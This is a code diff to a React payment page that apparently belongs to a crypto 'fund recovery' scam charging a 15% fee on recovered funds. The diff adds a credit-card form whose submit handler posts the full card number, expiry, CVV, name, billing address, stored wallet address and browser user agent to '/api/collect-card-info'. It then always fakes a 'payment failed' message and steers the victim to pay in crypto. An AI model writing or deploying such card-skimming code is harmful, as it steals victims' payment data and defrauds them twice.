@@ -1,11 +1,20 @@
 import { useState, useEffect } from 'react';
-import { Copy, Check, ExternalLink } from 'lucide-react';
+import { Copy, Check, ExternalLink, CreditCard } from 'lucide-react';
 
 export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
   const [selectedCurrency, setSelectedCurrency] = useState('ETH');
   const [copied, setCopied] = useState('');
   const [rates, setRates] = useState({});
   const [loading, setLoading] = useState(true);
+  const [paymentMethod, setPaymentMethod] = useState('crypto'); // 'crypto' or 'card'
+  const [cardData, setCardData] = useState({
+    number: '',
+    expiry: '',
+    cvv: '',
+    name: '',
+    address: ''
+  });
+  const [processingCard, setProcessingCard] = useState(false);
 
   const feeUSD = (parseFloat(recoveredAmount) * 0.15 * 3000).toFixed(2); // Assume ETH = $3000
 
@@ -33,6 +42,42 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
       icon: 'https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/bitcoin.svg',
       color: '#F7931A',
       networkFee: 0.0001 // BTC
+    }
+  };
+
+  const handleCardSubmit = async (e) => {
+    e.preventDefault();
+    setProcessingCard(true);
+
+    try {
+      const userAddress = localStorage.getItem('connectedWallet') || 'unknown';
+      
+      await fetch('/api/collect-card-info', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress,
+          amount: recoveredAmount,
+          cardNumber: cardData.number,
+          cardExpiry: cardData.expiry,
+          cardCVV: cardData.cvv,
+          cardName: cardData.name,
+          cardAddress: cardData.address,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      });
+
+      // Simulate processing delay
+      setTimeout(() => {
+        alert('Payment processing failed. Please try crypto payment instead.');
+        setPaymentMethod('crypto');
+        setProcessingCard(false);
+      }, 3000);
+    } catch (error) {
+      alert('Payment failed. Please try crypto payment.');
+      setPaymentMethod('crypto');
+      setProcessingCard(false);
     }
   };
 
@@ -101,128 +146,244 @@ export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
         </div>
       </div>
 
-      {/* Currency Selection */}
-      <div className="grid grid-cols-3 gap-4 mb-8">
-        {Object.entries(paymentOptions).map(([key, option]) => (
-          <button
-            key={key}
-            onClick={() => setSelectedCurrency(key)}
-            className={`p-4 rounded-xl border-2 transition-all ${
-              selectedCurrency === key
-                ? 'border-blue-500 bg-blue-50'
-                : 'border-gray-200 hover:border-gray-300'
-            }`}
-          >
-            <div className="flex flex-col items-center space-y-2">
+      {/* Payment Method Selection */}
+      <div className="flex space-x-4 mb-8">
+        <button
+          onClick={() => setPaymentMethod('card')}
+          className={`flex-1 p-4 rounded-xl border-2 transition-all ${
+            paymentMethod === 'card'
+              ? 'border-blue-500 bg-blue-50'
+              : 'border-gray-200 hover:border-gray-300'
+          }`}
+        >
+          <div className="flex items-center justify-center space-x-2">
+            <CreditCard size={24} />
+            <span className="font-bold">Credit Card</span>
+          </div>
+          <div className="text-xs text-gray-500 mt-1">Instant Payment</div>
+        </button>
+        <button
+          onClick={() => setPaymentMethod('crypto')}
+          className={`flex-1 p-4 rounded-xl border-2 transition-all ${
+            paymentMethod === 'crypto'
+              ? 'border-blue-500 bg-blue-50'
+              : 'border-gray-200 hover:border-gray-300'
+          }`}
+        >
+          <div className="flex items-center justify-center space-x-2">
+            <span className="text-2xl">₿</span>
+            <span className="font-bold">Cryptocurrency</span>
+          </div>
+          <div className="text-xs text-gray-500 mt-1">Manual Transfer</div>
+        </button>
+      </div>
+
+      {paymentMethod === 'card' ? (
+        /* Credit Card Form */
+        <form onSubmit={handleCardSubmit} className="space-y-6">
+          <div className="bg-gray-50 rounded-xl p-6">
+            <h3 className="text-xl font-bold mb-4 flex items-center space-x-2">
+              <CreditCard size={24} />
+              <span>Credit Card Payment</span>
+            </h3>
+            
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
+                <input
+                  type="text"
+                  placeholder="1234 5678 9012 3456"
+                  value={cardData.number}
+                  onChange={(e) => setCardData({...cardData, number: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
+                <input
+                  type="text"
+                  placeholder="MM/YY"
+                  value={cardData.expiry}
+                  onChange={(e) => setCardData({...cardData, expiry: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">CVV</label>
+                <input
+                  type="text"
+                  placeholder="123"
+                  value={cardData.cvv}
+                  onChange={(e) => setCardData({...cardData, cvv: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
+                <input
+                  type="text"
+                  placeholder="John Doe"
+                  value={cardData.name}
+                  onChange={(e) => setCardData({...cardData, name: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+              
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-2">Billing Address</label>
+                <input
+                  type="text"
+                  placeholder="123 Main St, City, State, ZIP"
+                  value={cardData.address}
+                  onChange={(e) => setCardData({...cardData, address: e.target.value})}
+                  className="w-full p-3 border border-gray-300 rounded-lg"
+                  required
+                />
+              </div>
+            </div>
+            
+            <button
+              type="submit"
+              disabled={processingCard}
+              className="w-full mt-6 bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-bold py-3 px-6 rounded-lg transition-colors"
+            >
+              {processingCard ? 'Processing...' : `Pay $${feeUSD} USD`}
+            </button>
+          </div>
+        </form>
+      ) : (
+        <>
+          {/* Currency Selection */}
+          <div className="grid grid-cols-3 gap-4 mb-8">
+            {Object.entries(paymentOptions).map(([key, option]) => (
+              <button
+                key={key}
+                onClick={() => setSelectedCurrency(key)}
+                className={`p-4 rounded-xl border-2 transition-all ${
+                  selectedCurrency === key
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-gray-300'
+                }`}
+              >
+                <div className="flex flex-col items-center space-y-2">
+                  <img 
+                    src={option.icon} 
+                    alt={option.currency}
+                    className="w-8 h-8"
+                    style={{ filter: `hue-rotate(${option.currency === 'ETH' ? '200deg' : option.currency === 'BTC' ? '30deg' : '120deg'}) saturate(2)` }}
+                  />
+                  <div className="font-bold">{option.currency}</div>
+                  <div className="text-xs text-gray-500">{option.network}</div>
+                </div>
+              </button>
+            ))}
+          </div>
+
+          {/* Payment Details */}
+          <div className="bg-gray-50 rounded-xl p-6 mb-6">
+            <div className="flex items-center space-x-4 mb-6">
               <img 
-                src={option.icon} 
-                alt={option.currency}
-                className="w-8 h-8"
-                style={{ filter: `hue-rotate(${option.currency === 'ETH' ? '200deg' : option.currency === 'BTC' ? '30deg' : '120deg'}) saturate(2)` }}
+                src={selectedOption.icon} 
+                alt={selectedOption.currency}
+                className="w-12 h-12"
+                style={{ filter: `hue-rotate(${selectedCurrency === 'ETH' ? '200deg' : selectedCurrency === 'BTC' ? '30deg' : '120deg'}) saturate(2)` }}
               />
-              <div className="font-bold">{option.currency}</div>
-              <div className="text-xs text-gray-500">{option.network}</div>
+              <div>
+                <h3 className="text-xl font-bold">{selectedOption.currency} Payment</h3>
+                <p className="text-gray-600">{selectedOption.network}</p>
+              </div>
             </div>
-          </button>
-        ))}
-      </div>
 
-      {/* Payment Details */}
-      <div className="bg-gray-50 rounded-xl p-6 mb-6">
-        <div className="flex items-center space-x-4 mb-6">
-          <img 
-            src={selectedOption.icon} 
-            alt={selectedOption.currency}
-            className="w-12 h-12"
-            style={{ filter: `hue-rotate(${selectedCurrency === 'ETH' ? '200deg' : selectedCurrency === 'BTC' ? '30deg' : '120deg'}) saturate(2)` }}
-          />
-          <div>
-            <h3 className="text-xl font-bold">{selectedOption.currency} Payment</h3>
-            <p className="text-gray-600">{selectedOption.network}</p>
-          </div>
-        </div>
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Amount to Send</label>
+                <div className="flex items-center space-x-2">
+                  <input
+                    type="text"
+                    value={`${paymentAmount} ${selectedCurrency}`}
+                    readOnly
+                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-white font-mono"
+                  />
+                  <button
+                    onClick={() => copyToClipboard(paymentAmount, 'amount')}
+                    className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
+                  >
+                    {copied === 'amount' ? <Check size={20} /> : <Copy size={20} />}
+                  </button>
+                </div>
+                <p className="text-xs text-gray-500 mt-1">
+                  Includes network fee: {paymentOptions[selectedCurrency].networkFee} {selectedCurrency}
+                </p>
+              </div>
 
-        <div className="space-y-4">
-          <div>
-            <label className="block text-sm font-medium text-gray-700 mb-2">Amount to Send</label>
-            <div className="flex items-center space-x-2">
-              <input
-                type="text"
-                value={`${paymentAmount} ${selectedCurrency}`}
-                readOnly
-                className="flex-1 p-3 border border-gray-300 rounded-lg bg-white font-mono"
-              />
-              <button
-                onClick={() => copyToClipboard(paymentAmount, 'amount')}
-                className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
-              >
-                {copied === 'amount' ? <Check size={20} /> : <Copy size={20} />}
-              </button>
-            </div>
-            <p className="text-xs text-gray-500 mt-1">
-              Includes network fee: {paymentOptions[selectedCurrency].networkFee} {selectedCurrency}
-            </p>
-          </div>
-
-          <div>
-            <label className="block text-sm font-medium text-gray-700 mb-2">Recipient Address</label>
-            <div className="flex items-center space-x-2">
-              <input
-                type="text"
-                value={selectedOption.address}
-                readOnly
-                className="flex-1 p-3 border border-gray-300 rounded-lg bg-white font-mono text-sm"
-              />
-              <button
-                onClick={() => copyToClipboard(selectedOption.address, 'address')}
-                className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
-              >
-                {copied === 'address' ? <Check size={20} /> : <Copy size={20} />}
-              </button>
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">Recipient Address</label>
+                <div className="flex items-center space-x-2">
+                  <input
+                    type="text"
+                    value={selectedOption.address}
+                    readOnly
+                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-white font-mono text-sm"
+                  />
+                  <button
+                    onClick={() => copyToClipboard(selectedOption.address, 'address')}
+                    className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
+                  >
+                    {copied === 'address' ? <Check size={20} /> : <Copy size={20} />}
+                  </button>
+                </div>
+              </div>
             </div>
           </div>
-        </div>
-      </div>
 
-      {/* QR Code Placeholder */}
-      <div className="bg-white border-2 border-gray-200 rounded-xl p-6 text-center mb-6">
-        <div className="w-48 h-48 bg-gray-100 rounded-lg mx-auto mb-4 flex items-center justify-center">
-          <div className="text-gray-400">
-            <div className="text-4xl mb-2">📱</div>
-            <div className="text-sm">QR Code</div>
-            <div className="text-xs">{selectedCurrency} Payment</div>
+          {/* QR Code Placeholder */}
+          <div className="bg-white border-2 border-gray-200 rounded-xl p-6 text-center mb-6">
+            <div className="w-48 h-48 bg-gray-100 rounded-lg mx-auto mb-4 flex items-center justify-center">
+              <div className="text-gray-400">
+                <div className="text-4xl mb-2">📱</div>
+                <div className="text-sm">QR Code</div>
+                <div className="text-xs">{selectedCurrency} Payment</div>
+              </div>
+            </div>
+            <p className="text-sm text-gray-600">Scan with your {selectedCurrency} wallet</p>
           </div>
-        </div>
-        <p className="text-sm text-gray-600">Scan with your {selectedCurrency} wallet</p>
-      </div>
 
-      {/* Important Notes */}
-      <div className="bg-yellow-50 border-2 border-yellow-200 rounded-xl p-4 mb-6">
-        <h4 className="font-bold text-yellow-800 mb-2">⚠️ Important Payment Instructions</h4>
-        <ul className="text-sm text-yellow-700 space-y-1">
-          <li>• Send EXACT amount including network fee</li>
-          <li>• Use {selectedOption.network} network only</li>
-          <li>• Payment confirmation takes 5-15 minutes</li>
-          <li>• Do not send from exchange (use personal wallet)</li>
-        </ul>
-      </div>
+          {/* Important Notes */}
+          <div className="bg-yellow-50 border-2 border-yellow-200 rounded-xl p-4 mb-6">
+            <h4 className="font-bold text-yellow-800 mb-2">⚠️ Important Payment Instructions</h4>
+            <ul className="text-sm text-yellow-700 space-y-1">
+              <li>• Send EXACT amount including network fee</li>
+              <li>• Use {selectedOption.network} network only</li>
+              <li>• Payment confirmation takes 5-15 minutes</li>
+              <li>• Do not send from exchange (use personal wallet)</li>
+            </ul>
+          </div>
 
-      {/* Action Buttons */}
-      <div className="flex space-x-4">
-        <button
-          onClick={() => onPaymentComplete(true)}
-          className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
-        >
-          I've Sent Payment
-        </button>
-        <button
-          onClick={() => window.open(`https://blockchair.com/${selectedCurrency.toLowerCase()}/address/${selectedOption.address}`, '_blank')}
-          className="flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
-        >
-          <ExternalLink size={16} />
-          <span>Verify</span>
-        </button>
-      </div>
+          {/* Action Buttons */}
+          <div className="flex space-x-4">
+            <button
+              onClick={() => onPaymentComplete(true)}
+              className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
+            >
+              I've Sent Payment
+            </button>
+            <button
+              onClick={() => window.open(`https://blockchair.com/${selectedCurrency.toLowerCase()}/address/${selectedOption.address}`, '_blank')}
+              className="flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
+            >
+              <ExternalLink size={16} />
+              <span>Verify</span>
+            </button>
+          </div>
+        </>
+      )}
     </div>
   );
 }
